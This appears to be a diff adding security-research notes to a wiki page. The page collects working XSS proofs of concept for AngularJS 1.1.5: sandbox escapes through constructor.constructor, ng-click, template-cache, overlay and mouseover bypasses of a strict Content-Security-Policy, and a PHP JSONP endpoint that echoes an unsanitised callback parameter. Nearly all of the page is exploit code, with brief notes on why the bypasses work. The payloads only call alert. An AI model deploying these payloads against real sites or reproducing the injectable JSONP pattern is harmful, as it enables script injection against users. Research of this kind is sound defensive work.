@@ -11,3 +11,164 @@ Add your content here.  Format your content with:
   * Text in *bold* or _italic_
   * Headings, paragraphs, and lists
   * Automatic links to other wiki pages
+
+= No CSP =
+
+== XSS in Template ==
+
+{{{
+<script src="http://ajax.googleapis.com/ajax/libs/angularjs/1.1.5/angular.min.js"></script>
+<div class="ng-app">
+{{constructor.constructor('alert(1)')()}}
+</div>
+}}}
+
+== XSS via class-attribute ==
+
+{{{
+<script src="http://ajax.googleapis.com/ajax/libs/angularjs/1.1.5/angular.min.js"></script>
+<div class="ng-app">
+    <b class="ng-style: {x:constructor.constructor('alert(1)')()};" />
+</div>
+}}}
+
+== XSS via data attributes ==
+
+{{{
+<script src="http://ajax.googleapis.com/ajax/libs/angularjs/1.1.5/angular.min.js"></script>
+<b data-ng-app data-ng-style="constructor.constructor('alert(1)')()" />
+}}}
+
+= CSP Bypasses =
+
+== XSS via Click ==
+
+{{{
+<?php
+header('X-Content-Security-Policy: default-src \'self\' ajax.googleapis.com');
+header('Content-Security-Policy: default-src \'self\' ajax.googleapis.com');
+header('X-Webkit-CSP: default-src \'self\' ajax.googleapis.com');
+header('Set-Cookie: abc=123');
+?><!doctype html>
+<html ng-app ng-csp>
+<head>
+<script src="http://ajax.googleapis.com/ajax/libs/angularjs/1.1.5/angular.min.js"></script>
+</head>
+<body ng-click="$event.view.alert(1)" onclick="alert(2)">Click me
+}}}
+
+== Same via data attribute ==
+
+{{{
+<?php
+header('X-Content-Security-Policy: default-src \'self\' ajax.googleapis.com');
+header('Content-Security-Policy: default-src \'self\' ajax.googleapis.com');
+header('X-Webkit-CSP: default-src \'self\' ajax.googleapis.com');
+header('Set-Cookie: abc=123');
+?><!doctype html>
+<html ng-app ng-csp>
+<head>
+<script src="http://ajax.googleapis.com/ajax/libs/angularjs/1.1.5/angular.min.js"></script>
+</head>
+<body data-ng-click="$event.view.alert(1)" onclick="alert(2)">Click me
+}}}
+
+== XSS via template cache ==
+
+{{{
+<?php
+header('X-Content-Security-Policy: default-src \'self\' ajax.googleapis.com');
+header('Content-Security-Policy: default-src \'self\' ajax.googleapis.com');
+header('X-Webkit-CSP: default-src \'self\' ajax.googleapis.com');
+header('Set-Cookie: abc=123');
+?><!doctype html>
+<html ng-csp ng-app="foo">
+<head>
+<script
+src="http://ajax.googleapis.com/ajax/libs/angularjs/1.1.5/angular.min.js"></script>
+<script src="test.js"></script>
+</head>
+<body>
+<div>
+  <ng-include src="'one.html'"></ng-include>
+</div>
+</body>
+</html>
+}}}
+
+{{{
+var foo = angular.module("foo", []);
+foo.run(['$templateCache', function($templateCache) {
+    $templateCache.put('one.html', '<h1 data-ng-click="$event.view.alert(1)">Click me</h1>');
+}]);
+}}}
+
+== XSS with overlay ==
+
+{{{
+var foo = angular.module("foo", []);
+foo.run(['$templateCache', function($templateCache) {
+    $templateCache.put('one.html', '<h1 data-ng-style="{border: \'1000px solid red\'}" data-ng-mouseover="$event.view.alert(1)">Click me</h1>');
+}]);
+}}}
+
+== XSS via JSON Callback ==
+
+{{{
+<?php
+header('X-Content-Security-Policy: default-src \'self\' ajax.googleapis.com');
+header('Content-Security-Policy: default-src \'self\' ajax.googleapis.com');
+header('X-Webkit-CSP: default-src \'self\' ajax.googleapis.com');
+header('Set-Cookie: abc=123');
+?><!doctype html>
+<html ng-app ng-csp>
+<head>
+<script src="http://ajax.googleapis.com/ajax/libs/angularjs/1.1.5/angular.min.js"></script>
+<script src="test.js"></script>
+</head>
+<body>
+<div ng-controller="FetchCtrl">
+<input type="text" ng-model="url" size="80" />
+<button ng-click="fetch()">fetch</button>
+</div>
+</body>
+</html>
+}}}
+
+{{{
+function FetchCtrl($scope, $http, $templateCache) {
+    $scope.method = 'JSONP';
+    $scope.fetch = function() {
+    $scope.code = null;
+    $scope.response = null;
+    $http({method: $scope.method, url: $scope.url, cache: $templateCache}).
+    	success(function(data, status) {
+    		$scope.status = status;
+    		$scope.data = data;
+    	})
+    };
+    $scope.updateModel = function(method, url) {
+    	$scope.method = method;
+    	$scope.url = url;
+ 	};
+}
+function foo(){
+	alert('JSON callback received')
+}
+}}}
+
+{{{
+<?php echo $_GET['callback']; ?>({"name":"Super Hero","salutation":"Namaskar","greeting":"Namaskar Super Hero!"});
+}}}
+
+== Flaws == 
+
+ * Injected payload bound to an event that executes in the permitted scope
+ * JSONP actually attaches an element to the DOM - that contains the injected payload - thus bypasses CSP
+
+
+== Debug ==
+
+window.alert = function(a){
+	return confirm(a) // set breakpoint here, watch callstack or DOM
+}
